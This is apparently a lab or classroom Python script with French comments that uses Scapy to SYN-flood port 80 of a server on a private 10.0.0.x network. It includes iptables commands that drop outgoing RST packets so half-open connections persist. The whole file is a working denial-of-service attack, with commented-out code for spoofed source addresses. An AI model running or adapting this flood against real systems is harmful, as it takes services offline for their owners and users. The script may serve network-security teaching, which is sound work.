# coding: utf8

# version qui envoie des demandes de connexion TCP sur le port 80 du serveur 2 . 
# On evite de renvoyer le 3eme paquet de la threhand shake pour que le serveur nous renvoie des demandes
# du coup a peut deboucher sur un DOS

# Attention avant d'executer ce script ( python synflooding.py)
# Il faut désactiver les paquets RST venant de ce poste vers le serveur 
# Cela permet de ne pas fermer la connexion et du coup le serveur nous renvoie des paquets SYN-ACK car il n'a reçu aucun RST ni ACK a sa réponse
# en root :  iptables -A OUTPUT -p tcp -s 10.0.0.3 --tcp-flags RST RST -j DROP
# pour enlever la règle :  iptables -D OUTPUT -p tcp -s 10.0.0.3 --tcp-flags RST RST -j DROP

import sys
import os
import time

from scapy.all import *


#fonction permettant de recuperer l adresse MAC a partir d une IP
def getMac(ip,interface):
	# srp(pkts,filter=None,iface=None,timeout=2,inter=0,verbose=None,chainCC=0,retry=0,multi=0,iface_hint=None)
	# srp envoie et recoit un message au nivau 2 (MAC). srp1 idem mais ne revoie que la 1ere reponse.
	# inter time in seconds to wait between each packet sent.
	answer, unanswer = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface)
	for envoi,reponse in answer:
		print reponse
		return reponse.sprintf("%Ether.src%")

try:
	#interface = raw_input("nom interface eth0 , eth1 ... ? ")
	#ipServeur = raw_input("IP du serveur actif ? ")
	#portServeur = int(raw_input("Port du serveur actif ? "))
	#fausseIp = raw_input("Vous souhaitez vous faire passer pour quelle fausse IP ? ")
	#portClientFausseIp = int(raw_input("Vous souhaitez vous faire passer pour quelle port TCP ? "))


	interface ="eth0"
	ipServeur = "10.0.0.2"
	portServeur = 80
	

except Exception, e:
   	print ("Erreur avant de commencer l'attaque...")
   	print (e)
   	sys.exit(1)

nbEnvois = 0  # nombre de paquets envoyes

while(True):
	try:
		#fausseIp = str(random.randint(173,191))+"."+str(random.randint(0,254))+"."+str(random.randint(0,254))+"."+str(random.randint(1,254))
		portClientRandom = random.randint(2000,40000)
		
		#On cree une entete TCP de demande connexion avec drapeau SYN
		enteteTcp = TCP(flags="S",dport=portServeur, sport=portClientRandom)

		#On cree une entete IP  (IP source : celle du poste pirate)
		enteteIp = IP(dst=ipServeur)

		#On cree une entete Ethernet avec adresse source celle du poste 1 et adresse destination celle du serveur 2
		#enteteEther = Ether(dst=serveurMac,src=fausseMac)

		# send envoie sans se charger de la reponse
		# print ("envoi imminent du paquet fausseIp=" +fausseIp +"portClientFausseIp:" + str(portClientFausseIp) )
		send(enteteIp/enteteTcp, verbose=0)   # sans affichage
		#sr1(enteteIp/enteteTcp)
		#send(enteteIp/enteteTcp) # avec affichage  send  paquet niveau 3 , sendp pour envoyer des trames (niveau 2)
		#srloop(enteteIp/enteteTcp , inter=0.3,retry=2,timeout=4)  
		nbEnvois = nbEnvois + 1
	
		
		
	except KeyboardInterrupt:
		print ("Attaque terminee par un control-C")
		print ("Nombre de paquets envoyes:"+str(nbEnvois)) 
		try:
			sys.exit(1)
			break  # on sort du while true si on n'est pas encore sorti du programme 
		except SystemExit:
			os._exit(1)

	





		


